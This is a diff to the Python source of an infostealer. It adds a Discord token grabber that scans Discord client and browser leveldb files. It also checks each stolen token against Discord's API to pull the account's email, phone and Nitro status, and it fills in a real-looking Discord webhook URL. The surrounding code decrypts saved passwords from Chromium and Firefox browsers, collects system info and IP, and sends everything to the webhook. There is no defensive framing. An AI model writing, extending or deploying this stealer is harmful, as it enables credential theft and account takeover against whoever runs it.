@@ -1,4 +1,5 @@
 import os
+import re
 import json
 import base64
 import sqlite3
@@ -10,14 +11,15 @@ import requests
 from Crypto.Cipher import AES
 import win32crypt
 
-webhook = "paste your webhook here skid"
+# this is what your webhook should look like.
 
+# remove the example webhook in between "webhook" with your own
 
+webhook = "https://discord.com/api/webhooks/1480196713338896598/Wx4s0-1bdUbRkkBxASMrDVFlbyq7KQsZPNGos5DjEPiSSwgLIsldn8sH6Qlcj7lGTA7_"
 
 
 
 # this list took me forever to make 😭
-
 chromium_browsers = {
     "Chrome":               os.path.join(os.environ["LOCALAPPDATA"], "Google\\Chrome\\User Data"),
     "Chrome Beta":          os.path.join(os.environ["LOCALAPPDATA"], "Google\\Chrome Beta\\User Data"),
@@ -53,6 +55,15 @@ firefox_browsers = {
     "SeaMonkey":   os.path.join(os.environ["APPDATA"], "Mozilla\\SeaMonkey\\Profiles"),
     "Thunderbird": os.path.join(os.environ["APPDATA"], "Thunderbird\\Profiles"),
 }
+
+discord_paths = {
+    "Discord":        os.path.join(os.environ["APPDATA"], "Discord\\Local Storage\\leveldb"),
+    "Discord PTB":    os.path.join(os.environ["APPDATA"], "discordptb\\Local Storage\\leveldb"),
+    "Discord Canary": os.path.join(os.environ["APPDATA"], "discordcanary\\Local Storage\\leveldb"),
+    "Discord Dev":    os.path.join(os.environ["APPDATA"], "discorddevelopment\\Local Storage\\leveldb"),
+}
+
+token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
 
 def getkey(path):
     try:
@@ -223,6 +234,74 @@ def grabFirefoxPasswords(browsername, profilesPath):
 
     return passwords
 
+def grabDiscordTokens():
+    found_tokens = []
+    seen = set()
+
+    for client_name, leveldb_path in discord_paths.items():
+        if not os.path.exists(leveldb_path):
+            continue
+
+        try:
+            for filename in os.listdir(leveldb_path):
+                if not filename.endswith(".ldb") and not filename.endswith(".log"):
+                    continue
+
+                filepath = os.path.join(leveldb_path, filename)
+                try:
+                    with open(filepath, "r", errors="ignore") as f:
+                        content = f.read()
+                        tokens = token_pattern.findall(content)
+                        for token in tokens:
+                            if token not in seen:
+                                seen.add(token)
+                                found_tokens.append(client_name + ": " + token)
+                except:
+                    pass
+        except:
+            pass
+
+    for browser_name, browser_path in chromium_browsers.items():
+        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+            ldb_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
+            if not os.path.exists(ldb_path):
+                continue
+
+            try:
+                for filename in os.listdir(ldb_path):
+                    if not filename.endswith(".ldb") and not filename.endswith(".log"):
+                        continue
+
+                    filepath = os.path.join(ldb_path, filename)
+                    try:
+                        with open(filepath, "r", errors="ignore") as f:
+                            content = f.read()
+                            tokens = token_pattern.findall(content)
+                            for token in tokens:
+                                if token not in seen:
+                                    seen.add(token)
+                                    found_tokens.append(browser_name + "/" + profile + ": " + token)
+                    except:
+                        pass
+            except:
+                pass
+
+    return found_tokens
+
+def validateToken(token):
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            username = data.get("username", "unknown") + "#" + data.get("discriminator", "0000")
+            email = data.get("email", "no email")
+            phone = data.get("phone", "no phone")
+            nitro = "Nitro" if data.get("premium_type", 0) > 0 else "No Nitro"
+            return username + " | " + email + " | " + phone + " | " + nitro
+        return None
+    except:
+        return None
+
 def sendToDiscord(message):
     chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
     for chunk in chunks:
@@ -238,26 +317,38 @@ def getsysinfo():
     info += "IP: " + socket.gethostbyname(socket.gethostname()) + "\n"
     return info
 
-allpasswords = []
-allpasswords.append(getsysinfo())
+alldata = []
+alldata.append(getsysinfo())
+
+tokens = grabDiscordTokens()
+if len(tokens) > 0:
+    alldata.append("\n=== Discord Tokens ===")
+    for t in tokens:
+        source = t.split(": ")[0]
+        token = t.split(": ")[1]
+        info = validateToken(token)
+        if info:
+            alldata.append("Source: " + source + "\nToken: " + token + "\nAccount: " + info)
+        else:
+            alldata.append("Source: " + source + "\nToken: " + token + "\nAccount: invalid/expired")
 
 for name, path in chromium_browsers.items():
     if os.path.exists(path):
         found = grabChromiumPasswords(name, path)
         if len(found) > 0:
-            allpasswords.append("\n=== " + name + " ===")
+            alldata.append("\n=== " + name + " ===")
             for p in found:
-                allpasswords.append(p)
+                alldata.append(p)
 
 for name, path in firefox_browsers.items():
     if os.path.exists(path):
         found = grabFirefoxPasswords(name, path)
         if len(found) > 0:
-            allpasswords.append("\n=== " + name + " ===")
+            alldata.append("\n=== " + name + " ===")
             for p in found:
-                allpasswords.append(p)
+                alldata.append(p)
 
-finaloutput = "\n\n".join(allpasswords)
+finaloutput = "\n\n".join(alldata)
 
 if finaloutput.strip() == "":
     sendToDiscord("nothing found lol")
